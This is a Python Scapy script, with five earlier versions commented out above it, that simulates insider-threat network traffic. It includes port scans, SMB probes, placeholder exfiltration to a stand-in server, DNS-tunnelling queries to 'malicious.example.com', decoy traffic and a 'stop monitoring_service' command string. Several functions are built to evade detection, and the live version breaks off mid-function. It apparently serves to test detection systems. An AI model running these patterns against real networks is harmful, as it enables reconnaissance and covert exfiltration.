# # # # # from scapy.all import *
# # # # # import time
# # # # # import random

# # # # # # Configuration
# # # # # TARGET_IP = "192.168.1.100"  # Target server's IP address
# # # # # EXFIL_SERVER_IP = "192.168.1.200"  # External server for data exfiltration
# # # # # LOCAL_IP = "192.168.1.50"  # IP address of the "insider" machine
# # # # # INSIDER_PORT = random.randint(1024, 65535)  # Random source port
# # # # # TARGET_PORT = 443  # Target port (e.g., HTTPS)
# # # # # EXFIL_PORT = 22  # Exfiltration server port (e.g., SSH)
# # # # # PACKET_SIZE = 1024  # Size of data packets (in bytes)
# # # # # INTERVAL = 0.5  # Interval between packets (in seconds)

# # # # # def simulate_data_exfiltration():
# # # # #     """
# # # # #     Simulates data exfiltration by sending large amounts of traffic to an external server.
# # # # #     """
# # # # #     print("[INFO] Simulating data exfiltration...")
# # # # #     for i in range(100):  # Number of packets to send
# # # # #         payload = "Sensitive data " * 64  # Large payload to mimic data exfiltration
# # # # #         packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
# # # # #         send(packet, verbose=False)
# # # # #         time.sleep(random.uniform(0.1, 0.3))  # Simulate realistic traffic timing
# # # # #     print("[INFO] Data exfiltration simulation completed.")

# # # # # def simulate_unauthorized_access():
# # # # #     """
# # # # #     Simulates unauthorized access attempts to a secure server.
# # # # #     """
# # # # #     print("[INFO] Simulating unauthorized access attempts...")
# # # # #     for i in range(50):  # Number of connection attempts
# # # # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT, flags="S")
# # # # #         send(packet, verbose=False)
# # # # #         time.sleep(random.uniform(0.2, 0.5))  # Random intervals between attempts
# # # # #     print("[INFO] Unauthorized access simulation completed.")

# # # # # def simulate_unusual_file_transfer():
# # # # #     """
# # # # #     Simulates large file transfers within the network.
# # # # #     """
# # # # #     print("[INFO] Simulating unusual file transfers...")
# # # # #     max_payload_size = 1400  # Typical MTU-safe size (adjust as needed)
# # # # #     payload = "File transfer data " * (max_payload_size // len("File transfer data "))  # Create a payload within limits
# # # # #     for i in range(30):  # Number of file transfer packets
# # # # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / UDP(sport=INSIDER_PORT, dport=69) / Raw(load=payload)
# # # # #         send(packet, verbose=False)
# # # # #         time.sleep(random.uniform(0.5, 1.0))  # Simulate slower file transfer timing
# # # # #     print("[INFO] Unusual file transfer simulation completed.")

# # # # # def main():
# # # # #     """
# # # # #     Main function to run all insider threat simulations.
# # # # #     """
# # # # #     print("[INFO] Starting insider threat simulation...")
# # # # #     simulate_data_exfiltration()
# # # # #     simulate_unauthorized_access()
# # # # #     simulate_unusual_file_transfer()
# # # # #     print("[INFO] Insider threat simulation completed.")

# # # # # if __name__ == "__main__":
# # # # #     try:
# # # # #         main()
# # # # #     except KeyboardInterrupt:
# # # # #         print("[INFO] Simulation interrupted.")

# # # # from scapy.all import *
# # # # import time
# # # # import random
# # # # import threading
# # # # import logging

# # # # # Logging configuration
# # # # logging.basicConfig(
# # # #     level=logging.INFO,
# # # #     format="%(asctime)s - %(levelname)s - %(message)s",
# # # #     handlers=[logging.StreamHandler()],
# # # # )

# # # # # Configuration
# # # # TARGET_IP = "192.168.1.100"  # Target server's IP address
# # # # EXFIL_SERVER_IP = "192.168.1.200"  # External server for data exfiltration
# # # # LOCAL_IP = "192.168.1.50"  # IP address of the "insider" machine
# # # # INSIDER_PORT = random.randint(1024, 65535)  # Random source port
# # # # TARGET_PORT = 443  # Target port (e.g., HTTPS)
# # # # EXFIL_PORT = 22  # Exfiltration server port (e.g., SSH)
# # # # PACKET_SIZE = 1024  # Size of data packets (in bytes)
# # # # INTERVAL = 0.5  # Interval between packets (in seconds)

# # # # # Reconnaissance configuration
# # # # RECON_PORT_RANGE = (20, 1024)  # Port range for scanning

# # # # def simulate_data_exfiltration():
# # # #     """
# # # #     Simulates data exfiltration by sending large amounts of traffic to an external server.
# # # #     """
# # # #     logging.info("Simulating data exfiltration...")
# # # #     for i in range(100):  # Number of packets to send
# # # #         payload = "Sensitive data " * (PACKET_SIZE // len("Sensitive data "))
# # # #         packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
# # # #         send(packet, verbose=False)
# # # #         time.sleep(random.uniform(0.1, 0.3))  # Simulate realistic traffic timing
# # # #     logging.info("Data exfiltration simulation completed.")

# # # # def simulate_unauthorized_access():
# # # #     """
# # # #     Simulates unauthorized access attempts to a secure server.
# # # #     """
# # # #     logging.info("Simulating unauthorized access attempts...")
# # # #     for i in range(50):  # Number of connection attempts
# # # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT, flags="S")
# # # #         send(packet, verbose=False)
# # # #         time.sleep(random.uniform(0.2, 0.5))  # Random intervals between attempts
# # # #     logging.info("Unauthorized access simulation completed.")

# # # # def simulate_unusual_file_transfer():
# # # #     """
# # # #     Simulates large file transfers within the network.
# # # #     """
# # # #     logging.info("Simulating unusual file transfers...")
# # # #     max_payload_size = 1400  # Typical MTU-safe size (adjust as needed)
# # # #     payload = "File transfer data " * (max_payload_size // len("File transfer data "))
# # # #     for i in range(30):  # Number of file transfer packets
# # # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / UDP(sport=INSIDER_PORT, dport=69) / Raw(load=payload)
# # # #         send(packet, verbose=False)
# # # #         time.sleep(random.uniform(0.5, 1.0))  # Simulate slower file transfer timing
# # # #     logging.info("Unusual file transfer simulation completed.")

# # # # def simulate_reconnaissance_scan():
# # # #     """
# # # #     Simulates reconnaissance by scanning open ports on a target.
# # # #     """
# # # #     logging.info("Simulating reconnaissance scan...")
# # # #     for port in range(*RECON_PORT_RANGE):
# # # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=port, flags="S")
# # # #         send(packet, verbose=False)
# # # #         time.sleep(0.05)  # Small interval between port scans
# # # #     logging.info("Reconnaissance scan simulation completed.")

# # # # def simulate_lateral_movement():
# # # #     """
# # # #     Simulates lateral movement within the internal network.
# # # #     """
# # # #     logging.info("Simulating lateral movement...")
# # # #     internal_targets = [f"192.168.1.{i}" for i in range(2, 254) if f"192.168.1.{i}" != LOCAL_IP]
# # # #     for target in random.sample(internal_targets, 10):  # Randomly select 10 internal targets
# # # #         payload = "Internal attack payload"
# # # #         packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="PA") / Raw(load=payload)
# # # #         send(packet, verbose=False)
# # # #         time.sleep(random.uniform(0.1, 0.3))
# # # #     logging.info("Lateral movement simulation completed.")

# # # # def trigger_anomaly_detection():
# # # #     """
# # # #     Simulates traffic patterns likely to trigger anomaly detection systems.
# # # #     """
# # # #     logging.info("Simulating anomaly detection trigger...")
# # # #     for _ in range(20):
# # # #         burst_packets = random.randint(10, 50)
# # # #         for _ in range(burst_packets):
# # # #             packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
# # # #             send(packet, verbose=False)
# # # #         time.sleep(random.uniform(0.2, 0.5))  # Brief pause between bursts
# # # #     logging.info("Anomaly detection simulation completed.")

# # # # def main():
# # # #     """
# # # #     Main function to run all simulations concurrently.
# # # #     """
# # # #     logging.info("Starting advanced insider threat simulation...")

# # # #     # Multi-threaded execution
# # # #     threads = [
# # # #         threading.Thread(target=simulate_data_exfiltration),
# # # #         threading.Thread(target=simulate_unauthorized_access),
# # # #         threading.Thread(target=simulate_unusual_file_transfer),
# # # #         threading.Thread(target=simulate_reconnaissance_scan),
# # # #         threading.Thread(target=simulate_lateral_movement),
# # # #         threading.Thread(target=trigger_anomaly_detection),
# # # #     ]

# # # #     for thread in threads:
# # # #         thread.start()

# # # #     for thread in threads:
# # # #         thread.join()

# # # #     logging.info("Insider threat simulation completed.")

# # # # if __name__ == "__main__":
# # # #     try:
# # # #         main()
# # # #     except KeyboardInterrupt:
# # # #         logging.info("Simulation interrupted.")

# # # from scapy.all import *
# # # import time
# # # import random
# # # import threading
# # # import logging

# # # # Logging configuration
# # # logging.basicConfig(
# # #     level=logging.INFO,
# # #     format="%(asctime)s - %(levelname)s - %(message)s",
# # #     handlers=[logging.StreamHandler()],
# # # )

# # # # Configuration
# # # TARGET_IP = "192.168.1.100"  # Target server's IP address
# # # EXFIL_SERVER_IP = "192.168.1.200"  # External server for data exfiltration
# # # LOCAL_IP = "192.168.1.50"  # IP address of the "insider" machine
# # # INSIDER_PORT = random.randint(1024, 65535)  # Random source port
# # # EXFIL_PORT = 443  # Exfiltration server port (HTTPS, mimicking legitimate traffic)
# # # TARGET_PORT = 22  # Target port for secure server
# # # PACKET_SIZE = 1024  # Size of data packets (in bytes)
# # # INTERVAL = 0.5  # Interval between packets (in seconds)

# # # # Covert channel configuration
# # # DNS_SERVER = "8.8.8.8"  # Public DNS server for covert DNS tunneling
# # # COVERT_DOMAIN = "malicious.example.com"

# # # # File exfiltration settings
# # # FILE_CHUNK_SIZE = 64  # Bytes per chunk to simulate slow leaks
# # # FILE_TRANSFER_INTERVAL = 5  # Interval in seconds between small leaks

# # # # Reconnaissance configuration
# # # RECON_PORT_RANGE = (20, 1024)  # Port range for scanning

# # # def simulate_slow_data_exfiltration():
# # #     """
# # #     Simulates slow data exfiltration to avoid detection by sending small packets at irregular intervals.
# # #     """
# # #     logging.info("Simulating slow data exfiltration...")
# # #     for _ in range(50):  # Slowly send 50 small chunks of data
# # #         payload = "Exfil data " * (PACKET_SIZE // len("Exfil data "))
# # #         packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload[:FILE_CHUNK_SIZE])
# # #         send(packet, verbose=False)
# # #         time.sleep(random.uniform(2, FILE_TRANSFER_INTERVAL))  # Mimic random small leaks
# # #     logging.info("Slow data exfiltration simulation completed.")

# # # def simulate_covert_channel():
# # #     """
# # #     Simulates a covert channel using DNS queries to exfiltrate data.
# # #     """
# # #     logging.info("Simulating covert channel with DNS tunneling...")
# # #     data_chunks = ["chunk1", "chunk2", "chunk3", "chunk4", "chunk5"]
# # #     for chunk in data_chunks:
# # #         dns_query = IP(src=LOCAL_IP, dst=DNS_SERVER) / UDP(sport=INSIDER_PORT, dport=53) / DNS(rd=1, qd=DNSQR(qname=f"{chunk}.{COVERT_DOMAIN}"))
# # #         send(dns_query, verbose=False)
# # #         time.sleep(random.uniform(1, 3))  # Add randomness to avoid patterns
# # #     logging.info("Covert channel simulation completed.")

# # # def simulate_adaptive_behavior():
# # #     """
# # #     Simulates adaptive behavior that reacts to network conditions or detection systems.
# # #     """
# # #     logging.info("Simulating adaptive behavior...")
# # #     packet_types = [TCP, UDP, ICMP]
# # #     for _ in range(30):  # Send 30 adaptive packets
# # #         selected_protocol = random.choice(packet_types)
# # #         if selected_protocol == TCP:
# # #             packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=random.choice([80, 443]), flags="S")
# # #         elif selected_protocol == UDP:
# # #             packet = IP(src=LOCAL_IP, dst=TARGET_IP) / UDP(sport=random.randint(1024, 65535), dport=69) / Raw(load="UDP payload")
# # #         else:
# # #             packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
# # #         send(packet, verbose=False)
# # #         time.sleep(random.uniform(0.5, 2))
# # #     logging.info("Adaptive behavior simulation completed.")

# # # def simulate_internal_account_probe():
# # #     """
# # #     Simulates an insider probing internal accounts to escalate privileges.
# # #     """
# # #     logging.info("Simulating internal account probing...")
# # #     usernames = ["admin", "test_user", "jdoe", "guest"]
# # #     for username in usernames:
# # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=22, flags="PA") / Raw(load=f"Login attempt: {username}")
# # #         send(packet, verbose=False)
# # #         time.sleep(random.uniform(1, 3))
# # #     logging.info("Internal account probing simulation completed.")

# # # def simulate_stealthy_reconnaissance():
# # #     """
# # #     Simulates stealthy reconnaissance by scanning random ports at slow intervals.
# # #     """
# # #     logging.info("Simulating stealthy reconnaissance...")
# # #     for port in random.sample(range(*RECON_PORT_RANGE), 20):  # Scan 20 random ports
# # #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
# # #         send(packet, verbose=False)
# # #         time.sleep(random.uniform(1, 3))  # Long delays between scans
# # #     logging.info("Stealthy reconnaissance simulation completed.")

# # # def simulate_decoy_traffic():
# # #     """
# # #     Simulates decoy traffic to disguise malicious activity.
# # #     """
# # #     logging.info("Simulating decoy traffic...")
# # #     for _ in range(100):
# # #         decoy_ip = f"192.168.1.{random.randint(1, 254)}"
# # #         packet = IP(src=LOCAL_IP, dst=decoy_ip) / TCP(sport=random.randint(1024, 65535), dport=random.choice([80, 443]), flags="PA")
# # #         send(packet, verbose=False)
# # #         time.sleep(random.uniform(0.1, 0.3))
# # #     logging.info("Decoy traffic simulation completed.")

# # # def main():
# # #     """
# # #     Main function to execute all simulations concurrently.
# # #     """
# # #     logging.info("Starting advanced insider threat simulation...")

# # #     threads = [
# # #         threading.Thread(target=simulate_slow_data_exfiltration),
# # #         threading.Thread(target=simulate_covert_channel),
# # #         threading.Thread(target=simulate_adaptive_behavior),
# # #         threading.Thread(target=simulate_internal_account_probe),
# # #         threading.Thread(target=simulate_stealthy_reconnaissance),
# # #         threading.Thread(target=simulate_decoy_traffic),
# # #     ]

# # #     for thread in threads:
# # #         thread.start()

# # #     for thread in threads:
# # #         thread.join()

# # #     logging.info("Advanced insider threat simulation completed.")

# # # if __name__ == "__main__":
# # #     try:
# # #         main()
# # #     except KeyboardInterrupt:
# # #         logging.info("Simulation interrupted.")

# # from scapy.all import *
# # import time
# # import random
# # import threading
# # import logging
# # from datetime import datetime, timedelta

# # # Logging configuration
# # logging.basicConfig(
# #     level=logging.INFO,
# #     format="%(asctime)s - %(levelname)s - %(message)s",
# #     handlers=[logging.StreamHandler()],
# # )

# # # Configuration
# # TARGET_IP = "192.168.1.100"  # Target server's IP address
# # EXFIL_SERVER_IP = "192.168.1.200"  # External server for data exfiltration
# # LOCAL_IP = "192.168.1.50"  # IP address of the "insider" machine
# # INSIDER_PORT = random.randint(1024, 65535)  # Random source port
# # EXFIL_PORT = 443  # Exfiltration server port (HTTPS, mimicking legitimate traffic)
# # TARGET_PORT = 22  # Target port for secure server
# # PACKET_SIZE = 1024  # Size of data packets (in bytes)
# # INTERVAL = 0.5  # Interval between packets (in seconds)

# # # Timing simulation
# # SIMULATION_DURATION = 10 * 60  # 10 minutes
# # END_TIME = datetime.now() + timedelta(seconds=SIMULATION_DURATION)

# # # Covert channel configuration
# # DNS_SERVER = "8.8.8.8"  # Public DNS server for covert DNS tunneling
# # COVERT_DOMAIN = "malicious.example.com"

# # # File exfiltration settings
# # FILE_CHUNK_SIZE = 64  # Bytes per chunk to simulate slow leaks
# # FILE_TRANSFER_INTERVAL = 10  # Interval in seconds between small leaks

# # # Reconnaissance configuration
# # RECON_PORT_RANGE = (20, 1024)  # Port range for scanning
# # LEGITIMATE_PORTS = [80, 443, 53]  # Mimic legitimate traffic

# # # Dynamic payloads to evade pattern detection
# # DYNAMIC_PAYLOADS = [
# #     "Normal operation log",
# #     "Error: Unable to connect to server",
# #     "Cache miss. Retrieving from database",
# #     "Request for configuration update",
# #     "User authentication success",
# #     "Sensitive data dump",  # Mixed with benign payloads
# # ]

# # def simulate_dynamic_covert_channel():
# #     """
# #     Simulates a covert channel using randomized dynamic payloads and DNS queries.
# #     """
# #     logging.info("Simulating covert channel with dynamic DNS tunneling...")
# #     while datetime.now() < END_TIME:
# #         chunk = random.choice(DYNAMIC_PAYLOADS)
# #         dns_query = IP(src=LOCAL_IP, dst=DNS_SERVER) / UDP(sport=INSIDER_PORT, dport=53) / DNS(rd=1, qd=DNSQR(qname=f"{chunk.replace(' ', '')}.{COVERT_DOMAIN}"))
# #         send(dns_query, verbose=False)
# #         time.sleep(random.uniform(5, 15))  # Irregular intervals to avoid detection
# #     logging.info("Covert channel simulation completed.")

# # def simulate_sleeper_exfiltration():
# #     """
# #     Simulates very slow data exfiltration with random delays to evade detection.
# #     """
# #     logging.info("Simulating sleeper data exfiltration...")
# #     while datetime.now() < END_TIME:
# #         if random.random() < 0.7:  # 70% chance to skip exfiltration to mimic legitimate behavior
# #             time.sleep(random.uniform(30, 60))  # Long idle periods
# #             continue

# #         payload = "Sensitive data " * (PACKET_SIZE // len("Sensitive data "))
# #         packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload[:FILE_CHUNK_SIZE])
# #         send(packet, verbose=False)
# #         time.sleep(random.uniform(FILE_TRANSFER_INTERVAL, FILE_TRANSFER_INTERVAL * 2))
# #     logging.info("Sleeper data exfiltration simulation completed.")

# # def simulate_blended_traffic():
# #     """
# #     Simulates traffic blending with legitimate patterns.
# #     """
# #     logging.info("Simulating blended traffic...")
# #     while datetime.now() < END_TIME:
# #         if random.random() < 0.5:  # Legitimate traffic
# #             port = random.choice(LEGITIMATE_PORTS)
# #             payload = random.choice(DYNAMIC_PAYLOADS)
# #         else:  # Malicious traffic
# #             port = EXFIL_PORT
# #             payload = "Exfiltrated data " * random.randint(1, 5)

# #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=port, flags="PA") / Raw(load=payload)
# #         send(packet, verbose=False)
# #         time.sleep(random.uniform(0.2, 3))  # Mimic natural delays
# #     logging.info("Blended traffic simulation completed.")

# # def simulate_advanced_reconnaissance():
# #     """
# #     Simulates reconnaissance with delays and legitimate-looking traffic patterns.
# #     """
# #     logging.info("Simulating advanced reconnaissance...")
# #     while datetime.now() < END_TIME:
# #         port = random.randint(*RECON_PORT_RANGE)
# #         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
# #         send(packet, verbose=False)
# #         time.sleep(random.uniform(2, 5))  # Slow, delayed scans
# #     logging.info("Advanced reconnaissance simulation completed.")

# # def simulate_user_mimicry():
# #     """
# #     Simulates user-like behavior to disguise malicious actions.
# #     """
# #     logging.info("Simulating user mimicry...")
# #     user_actions = [
# #         lambda: send(IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=80, flags="PA") / Raw(load="GET /index.html HTTP/1.1\r\n\r\n"), verbose=False),
# #         lambda: send(IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=random.randint(1024, 65535), dport=443, flags="PA") / Raw(load="POST /login HTTP/1.1\r\n\r\n"), verbose=False),
# #     ]
# #     while datetime.now() < END_TIME:
# #         random.choice(user_actions)()
# #         time.sleep(random.uniform(5, 15))  # Mimic legitimate usage delays
# #     logging.info("User mimicry simulation completed.")

# # def simulate_internal_lateral_movement():
# #     """
# #     Simulates lateral movement within the network with random, delayed patterns.
# #     """
# #     logging.info("Simulating internal lateral movement...")
# #     internal_targets = [f"192.168.1.{i}" for i in range(2, 254) if f"192.168.1.{i}" != LOCAL_IP]
# #     while datetime.now() < END_TIME:
# #         target = random.choice(internal_targets)
# #         payload = "Internal attack payload"
# #         packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="PA") / Raw(load=payload)
# #         send(packet, verbose=False)
# #         time.sleep(random.uniform(10, 30))  # Long intervals between lateral moves
# #     logging.info("Internal lateral movement simulation completed.")

# # def main():
# #     """
# #     Main function to run all simulations concurrently.
# #     """
# #     logging.info("Starting extended subtle insider threat simulation...")

# #     # Multi-threaded execution for simultaneous behaviors
# #     threads = [
# #         threading.Thread(target=simulate_dynamic_covert_channel),
# #         threading.Thread(target=simulate_sleeper_exfiltration),
# #         threading.Thread(target=simulate_blended_traffic),
# #         threading.Thread(target=simulate_advanced_reconnaissance),
# #         threading.Thread(target=simulate_user_mimicry),
# #         threading.Thread(target=simulate_internal_lateral_movement),
# #     ]

# #     for thread in threads:
# #         thread.start()

# #     for thread in threads:
# #         thread.join()

# #     logging.info("Extended insider threat simulation completed.")

# # if __name__ == "__main__":
# #     try:
# #         main()
# #     except KeyboardInterrupt:
# #         logging.info("Simulation interrupted.")

# from scapy.all import *
# import time
# import random
# import threading
# import logging

# # Logging configuration
# logging.basicConfig(
#     level=logging.INFO,
#     format="%(asctime)s - %(levelname)s - %(message)s",
#     handlers=[logging.StreamHandler()],
# )

# # Configuration
# TARGET_IP = "192.168.1.100"  # Target server's IP address
# EXFIL_SERVER_IP = "192.168.1.200"  # External server for data exfiltration
# LOCAL_IP = "192.168.1.50"  # IP address of the "insider" machine
# INSIDER_PORT = random.randint(1024, 65535)  # Random source port
# TARGET_PORT = 443  # Target port (e.g., HTTPS)
# EXFIL_PORT = 22  # Exfiltration server port (e.g., SSH)
# RECON_PORT_RANGE = (20, 1024)  # Port range for reconnaissance scanning
# PACKET_SIZE = 1024  # Packet size (in bytes)

# def simulate_reconnaissance():
#     """
#     Simulates reconnaissance by scanning open ports on the target.
#     """
#     logging.info("Starting reconnaissance scan...")
#     for port in random.sample(range(*RECON_PORT_RANGE), 30):  # Randomly sample ports
#         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=port, flags="S")
#         send(packet, verbose=False)
#         time.sleep(random.uniform(0.2, 0.5))  # Subtle timing
#     logging.info("Reconnaissance scan completed.")

# def simulate_unusual_access():
#     """
#     Simulates unusual access by generating simulated database queries.
#     """
#     logging.info("Simulating unusual file access...")
#     for _ in range(20):
#         payload = f"SELECT * FROM sensitive_data WHERE id={random.randint(1, 100)};"
#         packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT) / Raw(load=payload)
#         send(packet, verbose=False)
#         time.sleep(random.uniform(0.5, 1.0))  # Simulate normal traffic patterns
#     logging.info("Unusual file access simulation completed.")

# def simulate_data_exfiltration():
#     """
#     Simulates data exfiltration by sending packets to an external server.
#     """
#     logging.info("Simulating data exfiltration...")
#     for _ in range(10):  # A small number of packets to avoid being obvious
#         payload = "Sensitive data " * (PACKET_SIZE // len("Sensitive data "))
#         packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
#         send(packet, verbose=False)
#         time.sleep(random.uniform(1.5, 3.0))  # Long intervals to avoid detection
#     logging.info("Data exfiltration simulation completed.")

# def simulate_anomaly_detection_trigger():
#     """
#     Simulates subtle traffic bursts to trigger anomaly detection systems.
#     """
#     logging.info("Simulating anomaly detection triggers...")
#     for _ in range(3):  # Limited bursts
#         burst_packets = random.randint(5, 10)
#         for _ in range(burst_packets):
#             packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
#             send(packet, verbose=False)
#         time.sleep(random.uniform(5, 10))  # Long pauses between bursts
#     logging.info("Anomaly detection trigger simulation completed.")

# def simulate_lateral_movement():
#     """
#     Simulates lateral movement by sending exploratory packets to internal IPs.
#     """
#     logging.info("Simulating lateral movement...")
#     internal_targets = [f"192.168.1.{i}" for i in range(2, 254) if f"192.168.1.{i}" != LOCAL_IP]
#     for target in random.sample(internal_targets, 5):  # Randomly select 5 internal targets
#         payload = "Internal exploration payload"
#         packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="PA") / Raw(load=payload)
#         send(packet, verbose=False)
#         time.sleep(random.uniform(2, 4))  # Slow exploration
#     logging.info("Lateral movement simulation completed.")

# def simulate_security_circumvention():
#     """
#     Simulates an attempt to bypass security measures by disabling monitoring tools.
#     """
#     logging.info("Simulating security circumvention...")
#     payload = "sudo systemctl stop monitoring_service"  # Simulated command
#     packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=22) / Raw(load=payload)
#     send(packet, verbose=False)
#     time.sleep(random.uniform(2, 4))  # Subtle delay
#     logging.info("Security circumvention simulation completed.")

# def main():
#     """
#     Main function to run all simulations sequentially to mimic insider threat behavior.
#     """
#     logging.info("Starting subtle insider threat simulation...")
#     actions = [
#         simulate_reconnaissance,
#         simulate_unusual_access,
#         simulate_data_exfiltration,
#         simulate_anomaly_detection_trigger,
#         simulate_lateral_movement,
#         simulate_security_circumvention,
#     ]

#     # Execute each action with a random delay
#     for action in actions:
#         action()
#         time.sleep(random.uniform(10, 20))  # Delay between actions

#     logging.info("Subtle insider threat simulation completed.")

# if __name__ == "__main__":
#     try:
#         main()
#     except KeyboardInterrupt:
#         logging.info("Simulation interrupted.")

from scapy.all import *
import time
import random
import logging

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()],
)

# Configuration
TARGET_IP = "192.168.1.100"
EXFIL_SERVER_IP = "192.168.1.200"
LOCAL_IP = "192.168.1.50"
INSIDER_PORT = random.randint(1024, 65535)
TARGET_PORT = 443
EXFIL_PORT = 22
RECON_PORT_RANGE = (20, 1024)
PACKET_SIZE = 1024

def simulate_reconnaissance(level):
    """
    Simulates reconnaissance with different levels of stealth.
    """
    logging.info(f"Simulating reconnaissance at level {level}...")
    if level == 1:
        # Full port scan
        for port in range(*RECON_PORT_RANGE):
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=port, flags="S")
            send(packet, verbose=False)
    elif level == 2:
        # Random port scan
        for port in random.sample(range(*RECON_PORT_RANGE), 50):
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=port, flags="S")
            send(packet, verbose=False)
    elif level == 3:
        # Highly targeted scan
        for port in random.sample([22, 80, 443, 3306, 3389], 3):  # Common services
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=port, flags="S")
            send(packet, verbose=False)
    time.sleep(random.uniform(0.5, 1.0))
    logging.info("Reconnaissance completed.")

def simulate_unusual_access(level):
    """
    Simulates unusual file access with different levels of stealth.
    """
    logging.info(f"Simulating unusual access at level {level}...")
    if level == 1:
        # Repeated queries for large amounts of data
        for _ in range(20):
            payload = f"SELECT * FROM sensitive_data WHERE id > {random.randint(0, 100)};"
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT) / Raw(load=payload)
            send(packet, verbose=False)
    elif level == 2:
        # Targeted queries with longer intervals
        for _ in range(10):
            payload = f"SELECT name, role FROM sensitive_data WHERE id={random.randint(1, 100)};"
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT) / Raw(load=payload)
            send(packet, verbose=False)
            time.sleep(random.uniform(1, 2))
    elif level == 3:
        # Query for metadata only
        for _ in range(5):
            payload = f"SELECT COUNT(*) FROM sensitive_data;"
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / TCP(sport=INSIDER_PORT, dport=TARGET_PORT) / Raw(load=payload)
            send(packet, verbose=False)
            time.sleep(random.uniform(2, 4))
    logging.info("Unusual access completed.")

def simulate_data_exfiltration(level):
    """
    Simulates data exfiltration with different levels of stealth.
    """
    logging.info(f"Simulating data exfiltration at level {level}...")
    if level == 1:
        # Large payloads sent frequently
        for _ in range(10):
            payload = "Sensitive data " * (PACKET_SIZE // len("Sensitive data "))
            packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
            send(packet, verbose=False)
    elif level == 2:
        # Smaller payloads with longer intervals
        for _ in range(5):
            payload = "Data " * (PACKET_SIZE // 4)
            packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
            send(packet, verbose=False)
            time.sleep(random.uniform(1.5, 3.0))
    elif level == 3:
        # Encrypted payloads in small packets
        for _ in range(3):
            payload = "Encrypted data".encode("utf-8")
            packet = IP(src=LOCAL_IP, dst=EXFIL_SERVER_IP) / TCP(sport=INSIDER_PORT, dport=EXFIL_PORT) / Raw(load=payload)
            send(packet, verbose=False)
            time.sleep(random.uniform(2, 5))
    logging.info("Data exfiltration completed.")

def simulate_anomaly_detection_trigger(level):
    """
    Simulates traffic patterns to trigger anomaly detection.
    """
    logging.info(f"Simulating anomaly detection trigger at level {level}...")
    if level == 1:
        # High burst traffic
        for _ in range(50):
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
            send(packet, verbose=False)
    elif level == 2:
        # Moderate bursts with random intervals
        for _ in range(10):
            burst = random.randint(5, 10)
            for _ in range(burst):
                packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
                send(packet, verbose=False)
            time.sleep(random.uniform(1, 3))
    elif level == 3:
        # Very slow traffic
        for _ in range(5):
            packet = IP(src=LOCAL_IP, dst=TARGET_IP) / ICMP()
            send(packet, verbose=False)
            time.sleep(random.uniform(5, 10))
    logging.info("Anomaly detection trigger completed.")

def simulate_lateral_movement(level):
    """
    Simulates lateral movement within the network.
    """
    logging.info(f"Simulating lateral movement at level {level}...")
    internal_targets = [f"192.168.1.{i}" for i in range(2, 254) if f"192.168.1.{i}" != LOCAL_IP]
    if level == 1:
        # Probing multiple devices quickly
        for target in random.sample(internal_targets, 20):
            packet = IP(src=LOCAL_IP, dst=target) / TCP(sport=random.randint(1024, 65535), dport=445, flags="S")
            send(packet, verbose=False)
    elif level == 2:
